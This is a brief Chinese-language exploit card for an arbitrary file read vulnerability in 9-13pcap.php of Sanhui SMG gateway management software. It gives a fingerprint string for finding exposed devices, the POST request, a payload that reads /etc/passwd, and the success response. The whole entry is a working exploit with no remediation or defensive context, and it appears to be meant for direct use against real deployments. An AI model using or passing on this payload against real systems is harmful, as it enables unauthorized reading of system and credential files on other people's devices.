# 三汇SMG网关管理软件9-13pcap.php存在任意文件读取漏洞

三汇SMG网关管理软件 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="text ml10 mr20"`
- **请求**：`POST /en/9-13pcap.php HTTP/1.1`

**Payload**
```
down=1&downfile=/etc/passwd
```
- **响应特征**：200